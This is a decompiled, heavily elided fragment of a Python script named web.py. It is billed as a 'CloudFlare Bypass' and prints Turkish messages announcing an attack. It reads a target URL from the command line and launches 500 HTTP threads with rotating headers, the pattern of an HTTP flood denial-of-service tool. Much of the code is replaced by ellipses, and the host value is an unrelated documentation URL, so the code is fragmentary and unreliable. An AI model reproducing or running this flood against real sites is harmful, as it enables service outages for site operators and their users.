...
# [GCC 8.4.0]
# Embedded file name: web.py
# Compiled at: 2021-01-30 21:24:08
from future import standard_library
standard_library.install_aliases()
from builtins import chr
from builtins import range
import urllib.request, urllib.error, urllib.parse, sys, threading, random, re
url = ''
host = ''
headers_useragents = []
headers_referers = []
...
def usage():
    ...
    print('Mustafa Kemal ATATURK (*-*) Mert (*-*) [+]CloudFlare Bypass v1 Script web.py')
    print('\x07')
...
def httpcall(url):
    ...
    try:
        ...
        set_flag(1)
        print('=>root@mert - CloudFlare Bypass web.py V1<=')
        print('[*]\\>  Saldiri Gonderiyor...   <//[*] ')
        code = 500
...
if len(sys.argv) < 2:
    ...
    print('web.py CloudFlare Bypass V1')
    if len(sys.argv) == 3:
        if sys.argv[2] == 'safe':
            set_safe()
    url = sys.argv[1]
    ...
    host = "https://docs.python.org/3.7/c-api/veryhigh.html#c.PyFrameObject"
    for i in range(500):
        t = HTTPThread()
        t.start()
